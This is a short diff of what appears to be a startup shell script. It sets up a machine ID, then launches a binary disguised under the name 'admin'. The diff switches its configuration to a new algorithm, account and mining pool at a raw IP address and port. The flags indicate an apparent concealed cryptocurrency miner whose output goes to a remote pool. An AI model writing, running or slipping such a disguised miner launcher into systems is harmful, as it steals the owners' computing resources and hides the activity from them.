@@ -7,4 +7,4 @@ dbus-uuidgen --ensure
 systemd-machine-id-setup
 cat /etc/machine-id
 sleep 2
-./admin --pubkey 2wbiydSw8VekLhExxwSVTQP1wdLZb5QbtCC3TdUJCq2Z --no-pcie --pool 165.22.249.131:443
+./admin --algo ore --account CP_3wf3t9wmft --pool 47.238.54.68:9092 --cpu-off
